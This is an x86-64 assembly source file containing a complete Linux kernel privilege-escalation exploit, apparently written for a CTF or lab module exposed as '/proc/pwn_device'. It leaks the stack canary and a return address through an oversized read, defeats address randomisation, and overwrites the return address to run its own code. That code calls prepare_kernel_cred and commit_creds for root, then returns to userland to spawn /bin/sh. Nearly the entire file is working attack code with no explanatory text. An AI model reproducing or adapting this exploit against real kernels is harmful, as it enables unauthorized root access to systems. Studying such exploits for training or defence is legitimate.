bits 64

commit_creds_addr equ 0xffffffffb8c87e80
prepare_kernel_cred_addr equ 0xffffffffb8c881c0
sread_return_addr equ 0xffffffffb8e3e347

read_amount equ 0xa0
read_canary_offset equ 0x80
read_retaddr_offset equ 0x90

write_amount equ 0xa0
write_canary_offset equ 0x80
write_retaddr_offset equ 0x90

section .text

global _start
_start:
	; save segment registers and flags
	xor eax, eax
	mov ax, cs
	mov [save_cs], rax
	mov ax, ss
	mov [save_ss], rax
	pushf
	pop rax
	mov [save_flags], rax

	; open device file
	mov eax, 2
	mov rdi, device_file
	mov esi, 2
	syscall
	test rax, rax
	js error
	mov [fd], rax

	; extend write limit (ioctl)
	mov eax, 16
	mov rdi, [fd]
	mov esi, 0x20
	mov edx, 0x77777777
	syscall

	; read data
	xor eax, eax
	mov rdi, [fd]
	mov rsi, read_buf
	mov edx, read_amount
	syscall

	; construct payload
	mov rax, [read_buf + read_canary_offset]
	mov [payload_buf + write_canary_offset], rax
	mov qword [payload_buf + write_retaddr_offset], called_from_module

	; write payload
	mov eax, 1
	mov rdi, [fd]
	mov rsi, payload_buf
	mov edx, write_amount
	syscall

	; this write should result in jumping to called_from_module
	; if not, fall through to error
error:
	mov eax, 1
	mov edi, 1
	mov rsi, error_text
	mov edx, error_text_end - error_text
	syscall
	mov eax, 60
	mov edi, 1
	syscall

called_from_module:
	; call the magic functions to get root
	mov rax, [read_buf + read_retaddr_offset]
	sub rax, sread_return_addr
	add rax, prepare_kernel_cred_addr
	call rax
	mov rdi, rax
	mov rax, [read_buf + read_retaddr_offset]
	sub rax, sread_return_addr
	add rax, commit_creds_addr
	call rax

	; magic to get back to userland
	swapgs
	push qword [save_ss]
	push 0 ; rsp
	push qword [save_flags]
	push qword [save_cs]
	push launch_shell
	iretq

	; panic!
	xor eax, eax
	xor edx, edx
	xor ecx, ecx
	div ecx
panic:
	jmp panic

	; will be called from iret
launch_shell:
	mov eax, 59
	mov rdi, shell_file
	xor esi, esi
	xor edx, edx
	syscall

	; execve failed
	jmp error

section .data

device_file:
	db '/proc/pwn_device', 0

shell_file:
	db '/bin/sh', 0

error_text:
	db 'error', 0x0a
error_text_end:

section .bss

save_cs:
	resq 1
save_ss:
	resq 1
save_flags:
	resq 1

fd:
	resq 1

read_buf:
	resb read_amount

payload_buf:
	resb write_amount
